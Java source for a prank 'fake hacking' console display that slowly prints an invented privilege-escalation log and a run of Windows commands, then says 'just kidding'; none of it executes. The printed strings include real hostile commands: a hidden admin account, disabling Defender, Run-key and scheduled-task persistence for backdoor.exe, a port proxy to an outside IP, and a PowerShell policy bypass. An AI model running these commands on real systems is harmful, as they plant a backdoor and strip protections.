package classes;
import java.util.Random;

public class Typewriter {
    public static final Random random = new Random();

    public static void printSlowly(String text, int minDelay, int maxDelay) {
        for (char c : text.toCharArray()) {
            System.out.print(c);
            System.out.flush();

            try {
                Thread.sleep(random.nextInt(maxDelay - minDelay) + minDelay);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }
        System.out.println();
    }

    public static void handleInstall() {
        {
            String payload1 =
                "[SYSLOG] Initializing async runtime...\n" +
                "[INFO] Loading shared object: /usr/lib/libcrypto.so.1.1\n" +
                "[INFO] Resolving syscall table... DONE\n" +
                "[DEBUG] Identified kernel version: 5.15.0-76-generic\n" +
                "[INFO] Checking dirty COW vulnerability... VULNERABLE\n" +
                "[DEBUG] Mapping RWX segment in user space... SUCCESS\n" +
                "[INFO] Injecting payload into process 874 (systemd)\n" +
                "[INFO] Overwriting __free_hook to point to 0x7f02c414abc0\n" +
                "[INFO] Gaining escalated privileges... SUCCESS\n" +
                "[INFO] Spawning interactive shell on /dev/pts/4\n" +
                "[INFO] Establishing reverse connection to 46.249.64.41:4444\n" +
                "[DEBUG] /usr/bin/sudo modified, updating timestamp...\n" +
                "[INFO] Disabling audit logs... OK\n" +
                "[SYSLOG] Operation complete.\n" +
                "[INFO] Establishing connection...\n";
                
            System.out.println("Installing backdoor..");
            try {
                Thread.sleep(2000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }

            Typewriter.printSlowly(
                "[SYSLOG] Initializing async runtime...\n" +
                "[INFO] Loading shared object: /usr/lib/libcrypto.so.1.1\n" +
                "[INFO] Resolving syscall table... DONE\n" +
                "[DEBUG] Identified kernel version: 5.15.0-76-generic\n" +
                "[INFO] Checking dirty COW vulnerability... VULNERABLE\n" +
                "[DEBUG] Mapping RWX segment in user space... SUCCESS\n" +
                "[INFO] Injecting payload into process 874 (systemd)\n" +
                "[INFO] Overwriting __free_hook to point to 0x7f02c414abc0\n" +
                "[INFO] Gaining escalated privileges... SUCCESS\n" +
                "[INFO] Spawning interactive shell on /dev/pts/4\n" +
                "[INFO] Establishing reverse connection to 46.249.64.41:4444\n" +
                "[DEBUG] /usr/bin/sudo modified, updating timestamp...\n" +
                "[INFO] Disabling audit logs... OK\n" +
                "[SYSLOG] Operation complete.\n",
                1,
                3
            );

            System.out.print("[INFO] Establishing connection...\n");
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }


            Typewriter.printSlowly(
                "[INFO] Authenticating with known_host fingerprint...\n" +
                "[INFO] Privilege escalation successful.\n" +
                "[DEBUG] Disabling audit logs...\n" +
                "[INFO] Injecting payload into system process (pid 874)...\n" +
                "[WARNING] Unrecognized syscall detected: 0x4F3A9\n" +
                "[INFO] Connection to 46.249.64.41 established.\n" +
                "[INFO] Opening remote shell on /dev/pts/4\n",
                1,
                3
            );

            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }

            System.out.print("<f4lcon & flowtheory>: Input is streamed to JVM console instance, press enter to submit, exit to quit shell\n");
            System.out.print("<f4lcon & flowtheory>: Piping on reverse shell is NOT supported!\n");

            int typeSpeedMin = 50 / 50;
            int typeSpeedMax = 100 / 50;

            int delayTimeMin = 1000 / 50;
            int delayTimeMax = 1500 / 50;

            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }

            Typewriter.printSlowly("cd \\  \n", typeSpeedMin, typeSpeedMax);
            try {
                Thread.sleep(Typewriter.random.nextInt(delayTimeMax - delayTimeMin) + delayTimeMin);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            Typewriter.printSlowly("dir /a /s /b > C:\\Windows\\Temp\\sysdump.log  \n", typeSpeedMin, typeSpeedMax);
            try {
                Thread.sleep(Typewriter.random.nextInt(delayTimeMax - delayTimeMin) + delayTimeMin);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            Typewriter.printSlowly("whoami  \n", typeSpeedMin, typeSpeedMax);
            try {
                Thread.sleep(Typewriter.random.nextInt(delayTimeMax - delayTimeMin) + delayTimeMin);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            Typewriter.printSlowly("net user hiddenadmin P@ssw0rd! /add  \n", typeSpeedMin, typeSpeedMax);
            Typewriter.printSlowly("net localgroup Administrators hiddenadmin /add  \n", typeSpeedMin, typeSpeedMax);
            Typewriter.printSlowly("icacls C:\\Windows\\System32\\cmd.exe /grant Everyone:F  \n", typeSpeedMin, typeSpeedMax);
            try {
                Thread.sleep(Typewriter.random.nextInt(delayTimeMax - delayTimeMin) + delayTimeMin);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            Typewriter.printSlowly("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v svchost /t REG_SZ /d \"C:\\Windows\\System32\\backdoor.exe\" /f  \n", typeSpeedMin, typeSpeedMax);
            try {
                Thread.sleep(Typewriter.random.nextInt(delayTimeMax - delayTimeMin) + delayTimeMin);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            Typewriter.printSlowly("sc config WinDefend start= disabled  \n", typeSpeedMin, typeSpeedMax);
            Typewriter.printSlowly("net stop WinDefend  \n", typeSpeedMin, typeSpeedMax);
            try {
                Thread.sleep(Typewriter.random.nextInt(delayTimeMax - delayTimeMin) + delayTimeMin);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            Typewriter.printSlowly("netsh advfirewall firewall add rule name=\"Allow RDP\" dir=in action=allow protocol=TCP localport=3389  \n", typeSpeedMin, typeSpeedMax);
            Typewriter.printSlowly("netsh interface portproxy add v4tov4 listenport=8080 connectport=3389 connectaddress=46.249.64.41  \n", typeSpeedMin, typeSpeedMax);
            try {
                Thread.sleep(Typewriter.random.nextInt(delayTimeMax - delayTimeMin) + delayTimeMin);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            Typewriter.printSlowly("wmic process call create \"powershell -ExecutionPolicy Bypass -File C:\\Users\\Public\\payload.ps1\"  \n", typeSpeedMin, typeSpeedMax);
            Typewriter.printSlowly("schtasks /create /tn \"WinUpdate\" /tr \"C:\\Windows\\System32\\backdoor.exe\" /sc ONSTART /ru SYSTEM  \n", typeSpeedMin, typeSpeedMax);
            try {
                Thread.sleep(Typewriter.random.nextInt(delayTimeMax - delayTimeMin) + delayTimeMin);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            Typewriter.printSlowly("attrib +h C:\\Windows\\System32\\backdoor.exe  \n", typeSpeedMin, typeSpeedMax);
            Typewriter.printSlowly("shutdown -s -t 0", typeSpeedMin, typeSpeedMax);
            Typewriter.printSlowly("just kidding ~F.L.O.W.T.H.E.O.R.Y~", typeSpeedMin, typeSpeedMax);
            Typewriter.printSlowly("love from the USA", typeSpeedMin, typeSpeedMax);
        }
    }
}

